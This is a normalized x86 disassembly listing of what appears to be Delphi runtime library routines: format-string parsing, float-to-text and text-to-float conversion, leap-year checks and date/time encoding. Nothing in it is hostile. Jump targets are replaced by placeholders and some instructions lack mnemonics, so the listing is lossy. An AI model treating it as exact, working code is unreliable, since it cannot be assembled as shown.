jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c1f8
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408850
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407e10
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408b20
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408e77
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408c02
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408c4a
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408c02
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408b14
pop edx
or edx edx
je r-xdata
sub_408c02
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408e77
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408c4a
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408e77
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408a98
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408c71 ]
mov ebx ecx
sub cl 0x44
je sub_4081f4
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404260
jmp r-xdata
mov esi sub_4042c0
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4081f4
sub cl 0x44
je sub_408188
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408188
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4081f4
mov ecx 0x10
cmp bl 0x58
je sub_408188
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408af0
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409030
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408188
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408e98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408824
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408b20
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408ed8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408824
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408b20
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408f2c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4042f8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4042f8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408b20
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404128
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404038
mov eax esi
mov edx ebx
call sub_404684
mov eax [ ebp - 0x4 ]
call sub_4042f8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408b20
mov edx esi
xchg edx eax
call sub_404684
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408fec
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409030
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409304
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40912f
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409139
call sub_40912f
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408fec
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409195
call sub_40912f
call sub_409126
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_409126
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408fec
retn
xor ecx ecx
sub_4091d1
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_409126
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_409126
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409236
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40928a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_4091d1
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409304
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409331
jmp r-xdata
call sub_409453
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409331
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402e3c
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409453
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409530
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4095e7
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4095f2
neg edx
mov ecx esi
call sub_4095f2
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4095e7
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40960e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402e3c
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4095f2
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40960e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409644
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409030
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404128
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409674
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409030
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404128
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4096c0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esp
xor ecx ecx
call sub_409530
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4096ec
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044f8
mov edx esp
xor ecx ecx
call sub_409530
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409734
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409778
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4097e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409734
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407df4
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407df4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407df4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409844
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409880
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409844
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409948
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409734
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407df4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407df4
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407df4
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409844
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409a94
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409948
pop esi
pop ecx
pop ebp
retn 0x8
sub_409ab4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409734
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409af0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_402968
sub_409b34
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4042f8
mov edx eax
mov eax ebx
call sub_409af0
pop ecx
pop ebx
pop ebp
retn
sub_409b54
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408b20
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409af0
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ba0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
